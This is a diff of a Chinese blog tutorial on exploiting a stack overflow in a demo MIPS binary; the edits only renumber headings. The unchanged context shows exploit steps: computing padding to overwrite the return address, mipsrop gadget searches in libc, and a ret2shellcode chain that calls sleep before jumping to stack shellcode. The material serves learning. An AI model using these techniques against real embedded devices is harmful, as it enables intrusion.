@@ -82,12 +82,13 @@ mipsel-linux-gnu-gcc -fno-stack-protector stack_bof_02.c -o stack_bof_02
 ![image-20201028025116416](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028025118.png)
 代码逻辑很简单，在 strcpy 的地方有一处栈溢出。
 
-> 程序调试
+#### 1 程序调试
 `qemu-mipsel-static -g 1234 -L ./mipsel ./vuln_system  PAYLOAD`
 -g 指定调试端口， -L 指定 lib 等文件的目录，当程序起来之后
 `gdb-multiarch stack_bof_02` 运行如下命令，然后在 gdb 里运行 `target remote 127.0.0.1:1234` 即可挂上调试器
 ![image-20201028032102193](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028032104.png)
-> 控制 PC
+
+#### 2  控制 PC
 ![image-20201028030936453](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028030938.png)
 返回地址位于 $sp+532 , buf 位于 $fp+24
 即 padding 为 `pay += b'a'*508`
@@ -111,13 +112,13 @@ p.interactive()
 ```
 如下图所示，即可控制 ra 寄存器，进而控制 PC
 ![image-20201028031118603](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028031120.png)
-> 查找使用的 gadget 完成 ret2shellcode
+3. 查找可使用的 gadget 完成 ret2shellcode
 由于程序没有开启 PIE 等 保护，所以我们可以直接在栈上注入 shellcode，然后控制 PC跳转到栈上
 
 找 gadget 我们可以使用 mipsrop.py 这个 ida 插件进行。
 
 由于 mips 流水指令集的特点，存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode。为了找到更多的 gadget，以及这是一个 demo ，所有我们在 libc 里查找
-#### 1. 调用 sleep 函数
+#### 3 调用 sleep 函数
 调用 sleep 函数之前，我们需要先找到对 a0 进行设置的 gadget
 ```
 Python>mipsrop.find("li $a0, 1")
@@ -213,7 +214,7 @@ Python>mipsrop.find("mov $t9, $s3")
 .text:00094A14                 addiu   $sp, 0x38
 ```
 通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作
-#### 2. jmp shellcode
+#### 4  jmp shellcode
 
   下一步就是跳到 shellcode ，要跳到shellcode 我们先需要获得栈地址
 
